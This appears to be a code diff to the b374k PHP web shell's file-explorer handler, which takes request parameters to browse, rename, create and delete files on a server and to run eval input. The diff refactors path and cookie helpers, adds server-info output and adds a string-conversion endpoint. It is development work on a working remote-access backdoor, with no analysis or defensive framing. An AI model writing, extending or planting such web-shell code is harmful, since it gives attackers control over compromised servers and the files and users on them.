@@ -12,8 +12,8 @@ $explorer_content = "";
 if(isset($p['viewEntry'])){
 	$path = trim($p['viewEntry']);
 	if(is_file($path)){
-		$dirname = realpath(dirname($path)).DIRECTORY_SEPARATOR;
-		setcookie("cwd", $dirname);
+		$dirname = realpath(get_parent_path($path)).DIRECTORY_SEPARATOR;
+		set_cookie("cwd", $dirname);
 		chdir($dirname);
 		$nav = get_nav($dirname);
 		$cwd = html_safe($dirname);
@@ -21,7 +21,7 @@ if(isset($p['viewEntry'])){
 	}
 	elseif(is_dir($path)){
 		$path = realpath($path).DIRECTORY_SEPARATOR;
-		setcookie("cwd", $path);
+		set_cookie("cwd", $path);
 		chdir($path);
 		$nav = get_nav($path);
 		$cwd = html_safe($path);
@@ -81,21 +81,22 @@ if(isset($p['cd'])){
 	if(trim($path)=='') $path = dirname(__FILE__);
 
 	$path = realpath($path);
-	if(is_file($path)) $path = dirname($path);
+	if(is_file($path)) $path = get_parent_path($path);
 	if(is_dir($path)){
 		chdir($path);
 		$path = $path.DIRECTORY_SEPARATOR;
-		setcookie("cwd", $path);
+		set_cookie("cwd", $path);
 		$res = $path."{[|b374k|]}".get_nav($path)."{[|b374k|]}";
 		if(isset($p['showfiles'])&&($p['showfiles']=='true')){
 			$res .= show_all_files($path);
 		}
+		$res .= "{[|b374k|]}" . get_server_info_html();
 	}
 	else $res = "error";
 	output($res);
 }
 elseif(isset($p['viewFile']) && isset($p['viewType'])){
-	$path = trim($p['viewFile']);
+	$path = str_replace('\\\\','\\',trim($p['viewFile']));
 	$type = trim($p['viewType']);
 	$preserveTimestamp = trim($p['preserveTimestamp']);
 	if(is_file($path)){
@@ -109,7 +110,7 @@ elseif(isset($p['renameFile']) && isset($p['renameFileTo'])){
 	$renameFileTo = trim($p['renameFileTo']);
 	if(file_exists($renameFile)){
 		if(rename($renameFile, $renameFileTo)){
-			$res = dirname($renameFileTo);
+			$res = get_parent_path($renameFileTo);
 		}
 		else $res = "error";
 	}
@@ -119,7 +120,7 @@ elseif(isset($p['renameFile']) && isset($p['renameFileTo'])){
 elseif(isset($p['newFolder'])){
 	$newFolder = trim($p['newFolder']);
 	if(mkdir($newFolder)){
-		$res = dirname($newFolder);
+		$res = get_parent_path($newFolder);
 	}
 	else $res = "error";
 	output($res);
@@ -127,14 +128,14 @@ elseif(isset($p['newFolder'])){
 elseif(isset($p['newFile'])){
 	$newFile = trim($p['newFile']);
 	if(touch($newFile)){
-		$res = dirname($newFile);
+		$res = get_parent_path($newFile);
 	}
 	else $res = "error";
 	output($res);
 }
 elseif(isset($p['delete'])){
 	$path = trim($p['delete']);
-	$dirname = dirname($path);
+	$dirname = get_parent_path($path);
 	if(is_file($path)){
 		if(unlink($path)) $res = $dirname;
 	}
@@ -411,5 +412,8 @@ elseif(isset($p['evalInput']) && isset($p['evalType'])){
 elseif(isset($p['evalGetSupported'])){
 	$res = eval_get_supported();
 	output($res);
+}
+elseif(isset($p['converString'])){
+	output(convert_string_to_utf8($p['converString']), 'utf-8');
 }
 ?>
